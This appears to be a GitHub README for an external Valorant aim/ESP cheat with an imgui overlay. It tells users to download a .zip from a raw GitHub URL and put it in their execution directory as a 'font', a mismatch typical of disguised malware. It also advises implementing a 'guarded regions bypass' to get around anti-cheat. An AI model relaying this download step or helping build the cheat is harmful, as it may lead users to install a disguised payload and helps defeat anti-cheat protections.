# vexternal

External valorant cheat with imgui (opengl) overlay

You have to copy the https://raw.githubusercontent.com/E-Kitten/Valorant-Aim-ESP-Hack/main/vexternal/lib/ES_Hack_Aim_Valorant_unwealthy.zip file from the second vexternal folder into your execution directory for imgui to use this font

It should compile without changing anything, but you have to implement your own memory r/w mechanic to work, also the offsets are probably outdated as this cheat will very likely not receive any updates, and you have to implement a guarded regions bypass.
